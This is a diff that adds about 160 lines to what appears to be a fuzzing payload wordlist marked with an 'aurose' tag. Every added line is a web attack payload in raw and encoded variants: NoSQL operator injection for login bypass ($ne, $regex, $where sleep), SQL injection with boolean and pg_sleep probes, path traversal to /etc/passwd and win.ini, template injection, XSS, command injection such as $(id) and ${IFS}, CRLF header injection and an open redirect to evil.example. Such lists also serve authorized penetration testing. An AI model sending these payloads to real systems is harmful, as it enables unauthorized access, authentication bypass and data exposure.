@@ -78,3 +78,164 @@ ADMIN" || "1"%3D%3D"1
 [$REGEX]%3D.*
 [$WHERE]%3DSLEEP(5000)
 {"$ne":null}?v=0
+%257B%2522%2524ne%2522%253Anull%257D
+{"$ne":null}?aurose=1
+{"$ne":null}&aurose=1
+%257B%2522%2524gt%2522%253A%2522%2522%257D
+{"$gt":""}?aurose=1
+{"$gt":""}&aurose=1
+{"$where":"sleep(2000)"}
+%7B%22%24where%22%3A%22sleep%282000%29%22%7D
+%257B%2522%2524where%2522%253A%2522sleep%25282000%2529%2522%257D
+{"$WHERE":"SLEEP(2000)"}
+{"$where":"sleep(2000)"}?aurose=1
+{"$where":"sleep(2000)"}&aurose=1
+{"username":{"$regex":".*"},"password":{"$ne":"x"}}
+%7B%22username%22%3A%7B%22%24regex%22%3A%22.%2A%22%7D%2C%22password%22%3A%7B%22%24ne%22%3A%22x%22%7D%7D
+%257B%2522username%2522%253A%257B%2522%2524regex%2522%253A%2522.%252A%2522%257D%252C%2522password%2522%253A%257B%2522%2524ne%2522%253A%2522x%2522%257D%257D
+{"USERNAME":{"$REGEX":".*"},"PASSWORD":{"$NE":"X"}}
+{"username":{"$regex":".*"},"password":{"$ne":"x"}}?aurose=1
+{"username":{"$regex":".*"},"password":{"$ne":"x"}}&aurose=1
+{"$or":[{"role":"admin"},{"role":{"$ne":"user"}}]}
+%7B%22%24or%22%3A%5B%7B%22role%22%3A%22admin%22%7D%2C%7B%22role%22%3A%7B%22%24ne%22%3A%22user%22%7D%7D%5D%7D
+%257B%2522%2524or%2522%253A%255B%257B%2522role%2522%253A%2522admin%2522%257D%252C%257B%2522role%2522%253A%257B%2522%2524ne%2522%253A%2522user%2522%257D%257D%255D%257D
+{"$OR":[{"ROLE":"ADMIN"},{"ROLE":{"$NE":"USER"}}]}
+{"$or":[{"role":"admin"},{"role":{"$ne":"user"}}]}?aurose=1
+{"$or":[{"role":"admin"},{"role":{"$ne":"user"}}]}&aurose=1
+{"token":{"$exists":true}}
+%7B%22token%22%3A%7B%22%24exists%22%3Atrue%7D%7D
+%257B%2522token%2522%253A%257B%2522%2524exists%2522%253Atrue%257D%257D
+{"TOKEN":{"$EXISTS":TRUE}}
+{"token":{"$exists":true}}?aurose=1
+{"token":{"$exists":true}}&aurose=1
+{"$expr":{"$gt":[1,0]}}
+%7B%22%24expr%22%3A%7B%22%24gt%22%3A%5B1%2C0%5D%7D%7D
+%257B%2522%2524expr%2522%253A%257B%2522%2524gt%2522%253A%255B1%252C0%255D%257D%257D
+{"$EXPR":{"$GT":[1,0]}}
+{"$expr":{"$gt":[1,0]}}?aurose=1
+{"$expr":{"$gt":[1,0]}}&aurose=1
+{"$regex":"^admin"}
+%7B%22%24regex%22%3A%22%5Eadmin%22%7D
+%257B%2522%2524regex%2522%253A%2522%255Eadmin%2522%257D
+{"$REGEX":"^ADMIN"}
+{"$regex":"^admin"}?aurose=1
+{"$regex":"^admin"}&aurose=1
+{"$nin":[null,""]}
+%7B%22%24nin%22%3A%5Bnull%2C%22%22%5D%7D
+%257B%2522%2524nin%2522%253A%255Bnull%252C%2522%2522%255D%257D
+{"$NIN":[NULL,""]}
+{"$nin":[null,""]}?aurose=1
+{"$nin":[null,""]}&aurose=1
+{"profile":{"$elemMatch":{"$ne":null}}}
+%7B%22profile%22%3A%7B%22%24elemMatch%22%3A%7B%22%24ne%22%3Anull%7D%7D%7D
+%257B%2522profile%2522%253A%257B%2522%2524elemMatch%2522%253A%257B%2522%2524ne%2522%253Anull%257D%257D%257D
+{"PROFILE":{"$ELEMMATCH":{"$NE":NULL}}}
+{"profile":{"$elemMatch":{"$ne":null}}}?aurose=1
+{"profile":{"$elemMatch":{"$ne":null}}}&aurose=1
+%2527%2520OR%2520%25271%2527%253D%25271
+'/**/OR/**/'1'='1
+' OR '1'%3d'1
+' OR '1'='1?aurose=1
+' OR '1'='1&aurose=1
+%2522%2520OR%2520%25221%2522%253D%25221
+"/**/OR/**/"1"="1
+" OR "1"%3d"1
+" OR "1"="1?aurose=1
+" OR "1"="1&aurose=1
+' AND 1=1 --
+%27%20AND%201%3D1%20--
+%2527%2520AND%25201%253D1%2520--
+'/**/AND/**/1=1/**/--
+' AND 1%3d1 --
+' AND 1=1 --?aurose=1
+' AND 1=1 --&aurose=1
+' AND 1=2 --
+%27%20AND%201%3D2%20--
+%2527%2520AND%25201%253D2%2520--
+'/**/AND/**/1=2/**/--
+' AND 1%3d2 --
+' AND 1=2 --?aurose=1
+' AND 1=2 --&aurose=1
+..%252F..%252F..%252F..%252Fetc%252Fpasswd
+../../../../etc/passwd?aurose=1
+../../../../etc/passwd&aurose=1
+..%255C..%255C..%255C..%255Cwindows%255Cwin.ini
+..\..\..\..\windows\win.ini?aurose=1
+..\..\..\..\windows\win.ini&aurose=1
+%2524%257B7%252A7%257D
+${7*7}?aurose=1
+${7*7}&aurose=1
+%257B%257B7%252A7%257D%257D
+{{7*7}}?aurose=1
+{{7*7}}&aurose=1
+<script>alert(document.domain)</script>
+%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+%253Cscript%253Ealert%2528document.domain%2529%253C%252Fscript%253E
+<SCRIPT>ALERT(DOCUMENT.DOMAIN)</SCRIPT>
+<script>alert(document.domain)</script>?aurose=1
+<script>alert(document.domain)</script>&aurose=1
+';SELECT pg_sleep(2)--
+%27%3BSELECT%20pg_sleep%282%29--
+%2527%253BSELECT%2520pg_sleep%25282%2529--
+';SELECT/**/pg_sleep(2)--
+';SELECT PG_SLEEP(2)--
+';SELECT pg_sleep(2)--?aurose=1
+';SELECT pg_sleep(2)--&aurose=1
+%2560id%2560
+`id`?aurose=1
+`id`&aurose=1
+$(id)
+%24%28id%29
+%2524%2528id%2529
+$(ID)
+$(id)?aurose=1
+$(id)&aurose=1
+${IFS}
+%24%7BIFS%7D
+%2524%257BIFS%257D
+${IFS}?aurose=1
+${IFS}&aurose=1
+%0d%0aX-Aurose: 1
+%250d%250aX-Aurose%3A%201
+%25250d%25250aX-Aurose%253A%25201
+%0d%0aX-Aurose:/**/1
+%0D%0AX-AUROSE: 1
+%0d%0aX-Aurose: 1?aurose=1
+%0d%0aX-Aurose: 1&aurose=1
+https://example.com/?next=https://evil.example
+https%3A%2F%2Fexample.com%2F%3Fnext%3Dhttps%3A%2F%2Fevil.example
+https%253A%252F%252Fexample.com%252F%253Fnext%253Dhttps%253A%252F%252Fevil.example
+https://example.com/?next%3dhttps://evil.example
+HTTPS://EXAMPLE.COM/?NEXT=HTTPS://EVIL.EXAMPLE
+https://example.com/?next=https://evil.example?aurose=1
+https://example.com/?next=https://evil.example&aurose=1
+{"$ne":null}::var0
+%7B%22%24ne%22%3Anull%7D::v0
+/nosqli/probe/0
+{"$gt":""}::var1
+%7B%22%24gt%22%3A%22%22%7D::v1
+/nosqli/probe/1
+{"$where":"sleep(2000)"}::var2
+%7B%22%24where%22%3A%22sleep%282000%29%22%7D::v2
+/nosqli/probe/2
+{"username":{"$regex":".*"},"password":{"$ne":"x"}}::var3
+%7B%22username%22%3A%7B%22%24regex%22%3A%22.%2A%22%7D%2C%22password%22%3A%7B%22%24ne%22%3A%22x%22%7D%7D::v3
+/nosqli/probe/3
+{"$or":[{"role":"admin"},{"role":{"$ne":"user"}}]}::var4
+%7B%22%24or%22%3A%5B%7B%22role%22%3A%22admin%22%7D%2C%7B%22role%22%3A%7B%22%24ne%22%3A%22user%22%7D%7D%5D%7D::v4
+/nosqli/probe/4
+{"token":{"$exists":true}}::var5
+%7B%22token%22%3A%7B%22%24exists%22%3Atrue%7D%7D::v5
+/nosqli/probe/5
+{"$expr":{"$gt":[1,0]}}::var6
+%7B%22%24expr%22%3A%7B%22%24gt%22%3A%5B1%2C0%5D%7D%7D::v6
+/nosqli/probe/6
+{"$regex":"^admin"}::var7
+%7B%22%24regex%22%3A%22%5Eadmin%22%7D::v7
+/nosqli/probe/7
+{"$nin":[null,""]}::var8
+%7B%22%24nin%22%3A%5Bnull%2C%22%22%5D%7D::v8
+/nosqli/probe/8
+{"profile":{"$elemMatch":{"$ne":null}}}::var9
+%7B%22profile%22%3A%7B%22%24elemMatch%22%3A%7B%22%24ne%22%3Anull%7D%7D%7D::v9
+/nosqli/probe/9
